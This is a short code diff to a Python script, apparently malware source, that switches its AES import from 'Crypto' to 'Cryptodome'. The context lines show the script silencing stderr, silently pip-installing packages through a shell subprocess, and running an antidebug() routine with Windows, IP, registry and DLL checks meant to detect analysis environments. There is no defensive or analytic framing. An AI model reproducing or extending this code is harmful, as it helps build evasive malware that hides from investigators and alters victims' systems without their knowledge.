@@ -30,7 +30,7 @@ null_writer = NullWriter()
 stderr = null_writer
 
 ModuleRequirements = [
-    ["Crypto.Cipher", "pycryptodome" if not 'PythonSoftwareFoundation' in executable else 'Crypto']
+    ["Cryptodome.Cipher", "pycryptodome" if not 'PythonSoftwareFoundation' in executable else 'Crypto']
 ]
 for module in ModuleRequirements:
     try: 
@@ -39,7 +39,7 @@ for module in ModuleRequirements:
         subprocess.Popen(f"\"{executable}\" -m pip install {module[1]} --quiet", shell=True)
         time.sleep(3)
 
-from Crypto.Cipher import AES
+from Cryptodome.Cipher import AES
 
 def antidebug():
     checks = [check_windows, check_ip, check_registry, check_dll]
